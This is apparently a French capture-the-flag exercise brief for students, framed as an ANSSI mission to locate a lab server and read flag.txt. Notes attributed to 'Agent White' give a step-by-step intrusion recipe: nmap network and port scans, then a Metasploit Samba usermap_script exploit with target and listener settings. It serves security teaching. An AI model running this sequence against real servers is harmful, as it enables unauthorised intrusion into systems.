# Ordre de mission

Lors de votre stage de 2ème année, vous avez eu la chance d'intégrer l'ANSSI (Agence Nationale de la Sécurité des Systèmes d'Information) pour quelques mois. Un des agents de votre équipe a dérobé un serveur contenant des informations que vous devez absolument récupérer. La direction de l'ANSSI vous fait confiance et vous donne carte blanche pour récupérer ces informations.

Votre mission est de récupérer les informations contenues dans le fichier `flag.txt` situé sur le serveur. Ce serveur a été branché quelque part sur le réseau de l'ANSSI. L'ANSSI vous met à disposition une machine Kali Linux pour attaquer le serveur. Trouvez le serveur, attaquez-le et récupérez le fichier.

La sécurité de la France en dépend. Bonne chance agent.

PS : l'agent qui a dérobé le serveur vous a laissé ses notes pour vous aider à pirater le serveur. Votre responsable de stage pourras vous aidez, mais attention il est très occupé, ne le dérangé pas trop souvent.

# Notes de l'agent White

L'agent White a laissé ses notes personnelles sur la manière de pirater un serveur. Voici ce qu'il a écrit :

## Scan du réseau

Je dois premièrement connaître le réseau sur lequel je suis. Pour cela je peux utiliser la commande `ifconfig` pour connaître mon adresse IP et le masque de sous-réseau.

```bash
ifconfig
```

Ok je connais mon adresse IP et le masque de sous-réseau. Maintenant je dois scanner le réseau pour trouver le serveur. Je peux scanner le réseau avec un outil appelé `nmap`. Cet outil permet de scanner les ports ouverts sur une machine (les ports sont des points de connexion à une machine). Pour scanner le réseau, je peux utiliser la commande suivante :

```bash
nmap -sn <IP>/<masque>
```

## Scan des ports

Maintenant que je connais les machines connectées sur le réseau, je dois scanner les ports ouverts sur ces machines pour trouver une faille. Pour cela je peux utiliser la commande suivante :

```bash
nmap -p- -A <IP>
```

S'il y a des ports ouverts, je peux essayer de pirater le serveur, sinon je dois chercher une autre machine.

Si j'ai trouvé une machine avec des ports ouverts, je peux essayer de pirater le serveur. Pour cela je peux utiliser des outils comme `metasploit`. Cet outil permet de trouver des failles dans les services qui tournent sur le serveur et de les exploiter pour prendre le contrôle du serveur.

## Exploitation

Un collègue m'a récemment parlé d'une faille dans le service Samba `microsoft-ds` (serveurs de fichiers pour Microsoft). Voici comment il l'a exploitée :

```bash
# Ouvrir metasploit
msfconsole
# Rechercher le module pour exploiter la faille
msf6 > search samba
# Charger le module
msf6 > use exploit/multi/samba/usermap_script
# Configurer le module
msf6 > show options
msf6 > set RHOSTS <IP_SERVEUR>
msf6 > set LHOST <IP_KALI>
# Exécuter le module
msf6 > exploit
```

À partir de là, il devait être dans la machine mais je ne me souviens plus de la suite.

## Commandes Linux Pratiques

Quelques commandes Linux que j'utilise souvent :

```bash
# Lister les fichiers et dossiers dans le répertoire courant
ls
# Changer de répertoire
cd <nom_dossier>
# Lire le contenu d'un fichier
cat <nom_fichier>
# Afficher le chemin du répertoire courant
pwd
```
